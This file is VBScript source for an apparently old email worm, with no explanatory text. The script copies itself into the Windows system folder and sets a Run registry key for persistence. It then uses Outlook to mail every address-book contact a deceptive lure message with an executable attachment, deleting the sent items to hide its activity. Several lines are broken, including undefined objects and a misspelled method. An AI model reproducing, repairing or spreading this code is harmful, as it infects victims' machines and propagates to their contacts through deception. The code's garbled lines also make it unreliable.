On Error Resume Next
Dim ash1
Dim ash2
Dim ash3
Dim ash4
Dim ash5
Dim ash6
Dim ash7
Dim ash8
Dim ash9
Dim ash10
Set ash1 = CreateObject( "Scripting.FileSystemObject" )
ash1.CopyFile WScript.ScriptFullName, ash1.BuildPath( ash1.GetSpecialFolder(1), "ashley.VBS" )
Set ash2 = CreateObject( "WScript.Shell" )
ash2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "ashley", ash1.BuildPath( ash1.GetSpecialFolder(1), "ashley.VBS" )
ash4 = ash2.RegRead("HKEY_LOCAL_MACHINE\" & "ashley")
If ash4 = "" Or ash4 > 20 Then
ash4 = 0
End If
If ash4 = 0 Then
Set ash5 = CreateObject( "Outlook.Application" )
Set ash6 = A05.GetNameSpace( "MAPI" )
For Each ash7 In ash6.AddressLists
Set ash8 = ash5.CreateItem( 0 )
For ash9 = 1 To ash7.AddressEntries.Count
Set ash10 = ash7.AddressEntries( ash9 )
If ash = 1 Then
ash8.BCC = ash10.Address
Else
ash.BCC = ash8.BCC & "; " & ash10.Address
End If
Next
ash8.Subject = "This is Especially for you.Slightly R(a)"
ash8.Body = "This is very cute :). Have a look at it. I'm sure You will definately like it :) Don't worry it's not porn stuff.Remember to turn your speakers volume loud. "
ash8.Attachmets.Add("C:\windows\system\ashley_secret_xxx_diary.exe")
ash8.DeleteAfterSubmit = True
ash8.Send
Next
ash4 = 0
End If
ash2.RegWrite "HKEY_LOCAL_MACHINE\" & "ashley", ash4 + 1
